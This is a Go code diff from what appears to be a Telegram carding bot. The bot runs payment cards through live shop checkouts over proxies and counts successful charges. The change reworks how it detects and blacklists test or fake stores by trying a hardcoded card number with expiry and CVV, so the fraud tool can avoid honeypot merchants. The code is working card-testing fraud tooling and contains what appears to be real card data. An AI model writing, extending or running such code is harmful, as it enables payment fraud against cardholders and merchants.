@@ -822,21 +822,21 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 		switch r.Status {
 		case StatusCharged:
 			// Verify with a known dead card to detect test/fake stores
-			if !isBlacklisted(cr.shopURL) {
+			if cr.shopURL != "" && isBlacklisted(cr.shopURL) {
+				// Already known fake store, drop it
+				sess.Errors.Add(1)
+				continue
+			}
+			if cr.shopURL != "" {
 				const verifyCard = "4147207228677008|11|28|183"
 				fmt.Printf("[VERIFY] testing %s with dead card to detect fake store\n", cr.shopURL)
 				verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCard, cr.proxyURL)
 				if verifyRes != nil && verifyRes.Status == StatusCharged {
-					// Dead card charged = fake/test store, blacklist it
 					blacklistSite(cr.shopURL)
 					bot.Send(chat, fmt.Sprintf("⚠️ Test store detected & blacklisted: %s", cr.shopURL))
 					sess.Errors.Add(1)
 					continue
 				}
-			} else {
-				// Already blacklisted, don't count
-				sess.Errors.Add(1)
-				continue
 			}
 			sess.Charged.Add(1)
 			amt := parseAmount(r.Amount)
